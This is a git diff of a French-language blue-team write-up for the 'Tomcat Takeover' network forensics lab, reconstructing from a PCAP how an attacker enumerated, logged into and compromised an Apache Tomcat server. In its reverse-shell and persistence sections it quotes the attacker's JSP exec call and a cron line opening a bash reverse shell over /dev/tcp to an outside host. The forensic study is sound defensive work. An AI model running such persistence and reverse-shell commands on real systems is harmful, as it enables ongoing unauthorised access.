@@ -1,236 +1,258 @@
-# CyberDefenders — Tomcat Takeover Lab
+# Write-up FR — Tomcat Takeover Lab
 
-## 1. Informations générales
+Statut : terminé
 
-| Champ | Valeur |
-|---|---|
-| Plateforme | CyberDefenders |
-| Parcours | SOC Analyst Tier 1 |
-| Niveau | Level 3 |
-| Lab | Tomcat Takeover |
-| Catégorie | Network Forensics |
-| Difficulté | Easy |
-| Durée estimée | 30 minutes |
-| Outils principaux | Wireshark, NetworkMiner, tshark |
-| Statut | En cours |
+## 1. Contexte
 
-## 2. Liens utiles
+Ce write-up documente l’analyse d’un fichier PCAP lié à une compromission Apache Tomcat.
 
-| Source | Lien |
-|---|---|
-| CyberDefenders | https://cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover/ |
+L’objectif est de reconstruire la chaîne d’attaque depuis les traces réseau :
 
-## 3. Contexte du scénario
+1. identification de l’attaquant
+2. découverte du service exposé
+3. énumération des répertoires
+4. accès au panneau d’administration
+5. identification des identifiants valides
+6. upload d’un fichier WAR
+7. exécution d’un reverse shell
+8. installation d’une persistance.
 
-L’équipe SOC a identifié une activité suspecte sur un serveur web interne. Une capture réseau est fournie pour comprendre le périmètre de l’attaque et déterminer si le serveur Apache Tomcat a été compromis.
+## 2. Identification de l’attaquant
 
-## 4. Objectif de l’analyse
+L’analyse des requêtes HTTP montre deux clients principaux :
 
-L’objectif est d’analyser le fichier PCAP afin d’identifier l’adresse IP attaquante, les ports ciblés, le panneau d’administration, les outils d’énumération, les identifiants valides, le fichier malveillant uploadé et la commande utilisée pour maintenir une persistance.
+- `**********`, qui semble correspondre à une activité de navigation normale ;
+- `**********`, qui effectue une activité beaucoup plus suspecte.
 
-## 5. Préparation de l’environnement
+L’adresse `**********` est responsable de l’énumération, des tentatives d’accès au manager Tomcat, de l’upload WAR, puis de la connexion reverse shell.
+
+Réponse Q1 :
+
+```text
+********
+```
+
+## 3. Service exposé
+
+Les requêtes HTTP ciblent le serveur `**********` sur le port `****`.
+
+Ce port correspond au service web Tomcat exposé.
+
+Réponse Q3 :
+
+```text
+********
+```
+
+## 4. Énumération web
+
+Le User-Agent suivant apparaît dans les requêtes HTTP :
+
+```text
+************
+```
+
+Cela indique que l’attaquant a utilisé Gobuster pour découvrir des répertoires et fichiers web.
+
+Exemples de chemins testés :
+
+```text
+/admin
+/admin-console
+/host-manager
+/*******
+/*******/html
+/*******/list
+/status
+/webdav
+```
+
+Réponse Q4 :
+
+```text
+********
+```
+
+## 5. Découverte du panneau d’administration
+
+Les nombreuses requêtes vers `/*******`, `/*******/html` et d’autres chemins liés au Tomcat Manager montrent que l’attaquant cherche à accéder à l’interface d’administration.
+
+Le répertoire principal découvert est :
+
+```text
+/*******
+```
+
+Réponse Q5 :
+
+```text
+********
+```
+
+## 6. Brute-force ou test d’identifiants
+
+L’analyse des en-têtes HTTP Basic Auth montre plusieurs couples testés :
+
+```text
+*****:*****
+******:******
+admin:
+*****:******
+******:******
+*****:******
+```
+
+La combinaison qui permet ensuite d’accéder au manager et d’uploader le WAR est :
+
+```text
+*****:******
+```
+
+Réponse Q6 :
+
+```text
+********
+```
+
+## 7. Upload du fichier WAR
+
+L’attaquant envoie une requête POST vers :
+
+```text
+/*******/html/upload
+```
+
+Le contenu multipart révèle le nom du fichier uploadé :
+
+```text
+filename="******.***"
+```
+
+Réponse Q7 :
+
+```text
+********
+```
+
+## 8. Extraction et analyse du WAR
+
+Le WAR extrait contient les fichiers suivants :
+
+```text
+WEB-INF/
+WEB-INF/web.xml
+********.***
+```
+
+Le fichier `web.xml` indique que la JSP est utilisée comme fichier d’accueil :
+
+```xml
+<welcome-file>********.***</welcome-file>
+```
+
+La JSP contient du code Java permettant d’exécuter un shell système :
+
+```java
+Process process = Runtime.getRuntime().exec(ShellPath);
+```
+
+Elle établit aussi une connexion réseau sortante vers :
+
+```text
+10.0.0.142:80
+```
+
+Cependant, dans la capture réseau, la connexion observée après déclenchement part vers :
+
+```text
+**********:80
+```
+
+## 9. Déclenchement de la webshell
+
+Après l’upload, l’attaquant accède à :
+
+```text
+/******/
+```
+
+Cela déclenche l’exécution de la JSP malveillante contenue dans le WAR.
+
+## 10. Reverse shell
+
+Le flux TCP `****` montre une connexion interactive entre :
+
+```text
+**********:***** -> **********:80
+```
+
+Le suivi ASCII du flux révèle les commandes exécutées :
 
 ```bash
-mkdir -p ~/Documents/Tomcat_Takeover_Lab
-cd ~/Documents/Tomcat_Takeover_Lab
-unzip -P cyberdefenders.org 135-TomcatTakeover.zip -d temp_extract_dir
-cd temp_extract_dir
+whoami
+cd /tmp
+pwd
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/443 0>&1'" > cron
+crontab -i cron
+crontab -l
 ```
 
-## Artefact fourni
-
-| Fichier | Type | Commentaire |
-|---|---|---|
-| `web server.pcap` | PCAP | Capture réseau à analyser |
-
-## Hashes de l’artefact
-
-| Type | Valeur |
-|---|---|
-| MD5 | `9ab62c5a2a1f8d0030f8240355305e7` |
-| SHA256 | `9a8db2ec46186ff541f8f307544a5ceb07ce702f36d36fd8ae964bcb53f716` |
-
-
-## 6. Vérification de l’artefact
-
-```bash
-file web\ server.pcap
-sha256sum web\ server.pcap
-md5sum web\ server.pcap
-```
-
-Résultat observé :
+La commande `whoami` retourne :
 
 ```text
-web server.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4
+****
 ```
 
-## 7. Méthodologie
+## 11. Persistance
 
-1. Identifier les hôtes présents dans le PCAP
-2. Repérer l’activité de scan réseau
-3. Identifier l’adresse IP source la plus suspecte
-4. Rechercher le pays associé à l’IP attaquante
-5. Analyser les ports ciblés
-6. Identifier le port du panneau d’administration Tomcat
-7. Examiner les requêtes HTTP
-8. Rechercher les User-Agents et outils d’énumération
-9. Identifier les accès au panneau d’administration
-10. Analyser les tentatives de connexion
-11. Retrouver les identifiants valides
-12. Rechercher les uploads de fichiers
-13. Identifier les traces de reverse shell
-14. Rechercher une commande de persistance
-15. Documenter les IOCs et la timeline
+L’attaquant installe une tâche cron exécutée toutes les minutes :
 
-## 8. Commandes et filtres utiles
-
-### Conversations IP
-
-```bash
-tshark -r web\ server.pcap -q -z conv,ip
+```cron
+* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/443 0>&1'
 ```
 
-### Requêtes HTTP
+Cette persistance relance un reverse shell vers `**********` sur le port `***`.
 
-```bash
-tshark -r web\ server.pcap -Y "http.request" -T fields -e frame.time_relative -e ip.src -e ip.dst -e tcp.dstport -e http.request.method -e http.host -e http.request.uri -e http.user_agent
-```
-
-### Requêtes POST
-
-```bash
-tshark -r web\ server.pcap -Y "http.request.method == POST" -T fields -e frame.time_relative -e ip.src -e ip.dst -e tcp.dstport -e http.request.uri -e http.user_agent
-```
-
-### Authentification HTTP
-
-```bash
-tshark -r web\ server.pcap -Y "http.authorization" -T fields -e ip.src -e ip.dst -e http.authorization
-```
-
-### Filtres Wireshark
+Réponse Q8 :
 
 ```text
-http
-http.request
-http.request.method == "GET"
-http.request.method == "POST"
-http.authorization
-tcp.port == 8080
-ip.addr == <IP_A_COMPLETER>
-tcp.stream eq <NUMERO>
+********
 ```
 
-## 9. Réponses aux questions du lab
+## 12. Timeline synthétique
 
-Les réponses seront complétées pendant l’analyse puis partiellement masquées avant publication.
+| Temps relatif | Événement |
+|---:|---|
+| `386s` | Énumération Gobuster massive |
+| `409s` | Accès à `/*******/html` |
+| `418s - 437s` | Tentatives Basic Auth |
+| `437s` | Authentification réussie avec `*****:******` |
+| `547s` | Upload de `******.***` |
+| `556s` | Accès à `/******/` |
+| `563s+` | Reverse shell actif |
+| `669s` | Installation de la persistance cron |
 
-### Q1 — Adresse IP source responsable du scan
-
-**Réponse masquée :**
+## 13. IOCs
 
 ```text
-À compléter
+**********
+**********
+****
+80
+443
+/*******
+/*******/html
+/*******/html/upload
+/******/
+******.***
+********.***
+************
+*****:******
+tcp.stream == ****
 ```
 
-**Méthode :** analyser les conversations IP/TCP et repérer l’hôte qui initie de nombreuses connexions vers plusieurs ports.
+## 14. Conclusion
 
-### Q2 — Pays associé à l’adresse IP attaquante
+L’analyse confirme une compromission complète du serveur Tomcat.
 
-**Réponse masquée :**
-
-```text
-À compléter
-```
-
-**Méthode :** utiliser une source GeoIP à partir de l’adresse IP identifiée en Q1.
-
-### Q3 — Port du panneau d’administration web
-
-**Réponse masquée :**
-
-```text
-À compléter
-```
-
-**Méthode :** repérer les ports ouverts et identifier celui qui expose l’interface d’administration Tomcat.
-
-### Q4 — Outil utilisé pendant l’énumération
-
-**Réponse masquée :**
-
-```text
-À compléter
-```
-
-**Méthode :** examiner les User-Agents HTTP et les patterns de requêtes.
-
-### Q5 — Répertoire d’administration découvert
-
-**Réponse masquée :**
-
-```text
-À compléter
-```
-
-**Méthode :** filtrer les requêtes HTTP et rechercher les chemins liés à l’administration Tomcat.
-
-### Q6 — Identifiants utilisés avec succès
-
-**Réponse masquée :**
-
-```text
-À compléter
-```
-
-**Méthode :** analyser les en-têtes Authorization et les réponses HTTP indiquant une connexion réussie.
-
-### Q7 — Fichier malveillant uploadé
-
-**Réponse masquée :**
-
-```text
-À compléter
-```
-
-**Méthode :** chercher les requêtes POST liées à l’upload ou au déploiement d’un fichier.
-
-### Q8 — Commande de persistance planifiée
-
-**Réponse masquée :**
-
-```text
-À compléter
-```
-
-**Méthode :** suivre les flux post-compromission pour identifier une commande récurrente ou planifiée.
-
-## 10. IOCs à compléter
-
-| Type | Valeur | Description |
-|---|---|---|
-| PCAP MD5 | `9ab62c5a2a1f8d0030f8240355305e7` | Hash de l’artefact |
-| PCAP SHA256 | `9a8db2ec46186ff541f8f307544a5ceb07ce702f36d36fd8ae964bcb53f716` | Hash de l’artefact |
-| IP attaquant | À compléter | Source du scan et de l’attaque |
-| IP serveur | À compléter | Serveur web ciblé |
-| Port admin | À compléter | Port du panneau d’administration |
-| Répertoire admin | À compléter | Chemin découvert |
-| Fichier uploadé | À compléter | Fichier malveillant |
-| Commande de persistance | À compléter | Commande planifiée |
-
-## 11. Timeline provisoire
-
-| Temps | Événement | Source |
-|---|---|---|
-| À compléter | Début du scan | PCAP |
-| À compléter | Découverte du panneau admin | HTTP |
-| À compléter | Brute-force ou tentative de connexion | HTTP |
-| À compléter | Authentification réussie | HTTP |
-| À compléter | Upload du fichier malveillant | HTTP |
-| À compléter | Reverse shell | Flux réseau |
-| À compléter | Mise en place de persistance | Commande observée |
-
-## 12. Conclusion provisoire
-
-Ce lab permet de travailler l’analyse réseau à partir d’un PCAP et de reconstruire une compromission web Apache Tomcat, de la reconnaissance jusqu’à la persistance.
+L’attaquant `**********` a découvert le panneau `/*******`, validé les identifiants `*****:******`, uploadé le fichier `******.***`, déclenché la JSP `********.***`, obtenu un reverse shell avec privilèges `****`, puis installé une persistance cron vers `**********:443`.
